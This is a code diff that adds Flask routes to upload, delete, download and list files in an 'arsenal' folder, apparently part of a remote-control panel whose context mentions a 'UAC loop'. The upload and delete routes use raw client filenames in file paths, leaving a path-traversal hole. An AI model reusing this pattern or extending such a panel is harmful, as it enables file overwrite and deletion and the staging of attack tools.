@@ -2596,5 +2596,44 @@ result = "UAC loop started"
         except Exception as e:
             return jsonify({'status': 'error', 'message': str(e)}), 500
 
+    @app.route('/api/arsenal/upload', methods=['POST'])
+    @login_required
+    def upload_arsenal():
+        if 'file' not in request.files:
+            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
+        
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({'status': 'error', 'message': 'No file selected'}), 400
+        
+        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
+        os.makedirs(arsenal_dir, exist_ok=True)
+        file.save(os.path.join(arsenal_dir, file.filename))
+        return jsonify({'status': 'success'})
+
+    @app.route('/api/arsenal/delete/<string:filename>', methods=['DELETE'])
+    @login_required
+    def delete_arsenal(filename):
+        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
+        file_path = os.path.join(arsenal_dir, filename)
+        if os.path.exists(file_path):
+            os.remove(file_path)
+            return jsonify({'status': 'success'})
+        return jsonify({'status': 'error', 'message': 'File not found'}), 404
+
+    @app.route('/api/arsenal/download/<string:filename>')
+    @login_required
+    def download_arsenal_file(filename):
+        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
+        return send_from_directory(arsenal_dir, filename, as_attachment=True)
+
+    @app.route('/api/arsenal/list', methods=['GET'])
+    @login_required
+    def list_arsenal():
+        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
+        os.makedirs(arsenal_dir, exist_ok=True)
+        files = os.listdir(arsenal_dir)
+        return jsonify({'status': 'success', 'files': files})
+
     return app
 
